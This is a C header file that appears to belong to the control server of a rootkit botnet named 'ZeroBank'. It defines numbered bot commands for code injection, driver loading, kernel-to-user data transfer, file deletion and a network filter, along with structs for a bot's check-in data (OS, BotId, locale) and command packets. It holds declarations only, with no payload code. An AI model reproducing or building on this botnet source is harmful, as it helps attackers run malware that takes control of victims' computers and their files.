#pragma once

#include <Windows.h>
#include <stdio.h>

#include "server_ntapi.h"
#include "server_modules.h"
#include "server_file.h"
#include "server_process.h"
#include "server_thread.h"
#include "server_transfer.h"
#include "server_disconnect.h"
#include "server_info.h"
#include "server_rc4.h"
#include "server_md5.h"
#include "server_cmd.h"
#include "server_connections.h"
#include "server_tdifilter.h"
#include "server_sendrequests.h"


#pragma comment(lib,"ws2_32.lib")


#define ZB_INJECT							1
#define ZB_KERNEL_TO_USER_TRANSFER			2
#define ZB_USER_TO_KERNEL_TRANSFER			3
#define ZB_LOAD_DRIVER						4
#define ZB_DISCONNECT						5
#define ZB_EPROCESS							6
#define ZB_ETHREAD							7
#define ZB_MODULES							8
#define	ZB_FILE_EXPLORER					9
#define ZB_DELETE_FILE						10
#define ZB_INTERNAL_SYSTEM_INFORMATION		11
#define ZB_START_TDI_FILTER					12
#define ZB_STOP_TDI_FILTER					13
#define ZB_GET_BOT_CONNECTIONS				14
#define ZB_GET_BOT_SEND_REQUESTS			15



DWORD WINAPI ClientThread(LPVOID lParam);
DWORD WINAPI ServerThread(USHORT Port, PCHAR Ip);
extern 	RTL_CRITICAL_SECTION g_sec;


typedef struct _ZEROBANK_BOT_HEADER
{
	CHAR Os[40];
	ULONG majorver;
	ULONG minorver;
	ULONG Build;
	CHAR Arch[5];
	CHAR BotId[255];
	BOOLEAN IsNtServer;
	CHAR Locale[255];
	CHAR lang[255];
}ZEROBANK_BOT_HEADER, *PZEROBANK_BOT_HEADER;


typedef struct _ZEROBANK_PACKET_TYPE
{
	UCHAR PacketType;
	UINT32 ProcessId_For_ETHREAD_plugin;
	UINT32 ProcessId_For_QueryProcessInformation_Plugin;
	CHAR FileName_For_FileExplorer_plugin[255];
	CHAR FileName_For_File_Transfer[255];
	CHAR FileName_For_File_Deletion[255];
}ZEROBANK_PACKET_TYPE, *PZEROBANK_PACKET_TYPE;





